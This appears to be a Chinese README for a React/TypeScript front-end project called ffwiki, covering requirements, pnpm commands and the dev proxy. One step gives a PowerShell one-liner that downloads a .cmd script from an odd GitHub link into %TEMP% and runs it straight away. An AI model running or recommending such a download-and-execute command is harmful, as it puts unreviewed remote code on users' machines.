# ffwiki

技术栈：React + TypeScript + Tailwind CSS + HeroUI

## 环境要求

- Node.js（v24 及以上）
- pnpm（11.x 及以上）

## 启动项目
### 脚本启动
下载脚本并双击运行（默认git clone到c盘根目录）[点我下载脚本](https://github.com/8f6f2bef-6999-4945-ba47-f65049e6be49)

或者在bash中执行：
```bash
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/8f6f2bef-6999-4945-ba47-f65049e6be49', '%TEMP%\auto-deploy.cmd'); Start-Process '%TEMP%\auto-deploy.cmd'"
```
### powershell或者command bash启动
安装pnpm依赖库
```bash
pnpm install
```
启动开发服务器
```bash
pnpm dev
```

启动后访问 http://localhost:5173

常用命令：

- `pnpm dev` — 启动开发服务器（支持 HMR）
- `pnpm build` — 构建生产版本
- `pnpm preview` — 本地预览构建产物

> 开发环境下，前端会把 `/api` 请求代理到 `http://localhost:11450`（即后端服务）。

## 构建生产版本

```bash
pnpm build
# 产物输出到 dist
```
